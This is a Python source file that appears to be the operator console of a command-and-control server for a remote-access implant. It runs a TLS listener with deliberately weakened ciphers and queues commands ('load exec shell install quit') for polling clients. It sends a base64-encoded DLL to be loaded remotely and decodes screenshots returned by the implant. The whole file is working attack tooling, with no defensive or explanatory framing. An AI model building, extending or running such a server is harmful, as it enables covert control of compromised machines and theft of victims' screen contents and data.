import http.server
import ssl
import threading
import sys
import base64
import zlib
import json

def bmp(data):
    d = json.loads(data)
    with open("D:\\bitmap.bmp", "wb") as f:
        f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))

PREVIOUS_CMD = b""
CURRENT_POST = b""
STDOUT_O = sys.stdout

def get_ssl_context(certfile, keyfile):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain(certfile, keyfile)
    context.set_ciphers("@SECLEVEL=1:ALL")
    return context


class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        global CURRENT_POST
        global STDOUT_O
        global PREVIOUS_CMD
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        received = post_data
        if (received != b"none"):
            STDOUT_O.write("PREVIOUS_CMD: " + str(PREVIOUS_CMD))
            # (sys.stdout,tmp) = (STDOUT_O,sys.stdout)
            # print(received)
            # sys.stdout = tmp
            if PREVIOUS_CMD[:10] == b"screenshot":
                bmp(received)
            for line in str(received)[2:-1].split("\\n"):
                _ = STDOUT_O.write(line + "\n")
            # I know this is weird, but it avoids "Failed to decode byte 0xfe in position 9" and other such errors
        # Send response back to client
        response = CURRENT_POST
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)
        PREVIOUS_CMD = response
        CURRENT_POST = b""

def serve_http():
    server_address = ("127.0.0.1", 443)
    httpd = http.server.HTTPServer(server_address, MyHandler)
    
    context = get_ssl_context("cert.pem", "key.pem")
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    print("Starting HTTP server on https://127.0.0.1:443")
    sys.stdout = open("stdout.log", "w")
    sys.stderr = open("stderr.log", "w")
    httpd.serve_forever()

def command_loop():
    global CURRENT_POST
    while True:
        STDOUT_O.write("Commands Available: load exec shell install quit\n> ")
        check = input("").encode() + b' '
        if len(check) > 1:
            if b"LOADTEST" in check:
                with open("screenshot.dll", "rb") as f:
                    data = f.read()
                CURRENT_POST = b"load " + base64.b64encode(data) + b' '
                STDOUT_O.write("Length: " + str(len(CURRENT_POST)))
            else:
                CURRENT_POST = check

if __name__ == '__main__':
    # Create a thread for HTTP server
    http_thread = threading.Thread(target=serve_http)
    http_thread.daemon = True  # Daemonize the thread so it will be killed when the main program exits
    http_thread.start()
    command_loop()
    
